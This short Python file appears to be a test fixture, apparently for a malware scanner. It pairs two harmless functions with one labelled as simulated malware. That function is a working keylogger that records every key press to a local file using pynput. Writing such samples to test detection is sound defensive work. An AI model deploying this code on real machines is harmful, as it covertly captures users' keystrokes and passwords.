# test_file.py

# -----------------------------
# Suspicious function (simulating malware)
# -----------------------------
def keylogger_simulation():
    import sys
    import time
    from pynput.keyboard import Key, Listener

    keys = []

    def on_press(key):
        keys.append(key)
        with open("keylog.txt", "a") as f:
            f.write(str(key))

    with Listener(on_press=on_press) as listener:
        listener.join()


# -----------------------------
# Safe function 1
# -----------------------------
def calculate_sum(a, b):
    return a + b


# -----------------------------
# Safe function 2
# -----------------------------
def greet_user(name):
    print(f"Hello, {name}!")